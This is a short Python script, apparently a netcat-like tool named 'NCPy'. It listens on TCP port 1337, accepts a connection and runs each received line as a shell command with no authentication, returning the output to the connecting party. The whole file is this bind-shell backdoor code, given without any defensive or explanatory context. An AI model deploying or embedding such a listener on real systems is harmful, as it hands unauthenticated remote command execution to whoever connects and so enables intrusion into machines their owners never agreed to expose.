
 #!/usr/bin/env python3

import sys
import socket
import threading
import subprocess


def server_loop():
    
    hostname = socket.gethostname()
    host = socket.gethostbyname(hostname)
    port = 1337
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()

    client_socket, addr = server.accept()
    print(f'Incoming -> {addr}')
    client_thread = threading.Thread(
        target=client_handler, args=(
            client_socket, ))
    client_thread.start()

def client_handler(socket_obj):
    while True:
        socket_obj.send(b'<NCPy:#> ')
        cmd_buffer = b''
        while b'\n' not in cmd_buffer:
            cmd_buffer += socket_obj.recv(1024)
        if cmd_buffer.strip() == b'EXIT':
            print('\n')
            sys.exit()
        response = run_command(cmd_buffer)
        socket_obj.send(response)

def run_command(command: str):
        command = command.rstrip()
        try:
            output = subprocess.check_output(
                command, stderr=subprocess.STDOUT, shell=True)
        except BaseException:
            output = f'Failed to execute {command} command on host:1337.\r\n'.encode()
        return output

def run():
    server_loop()

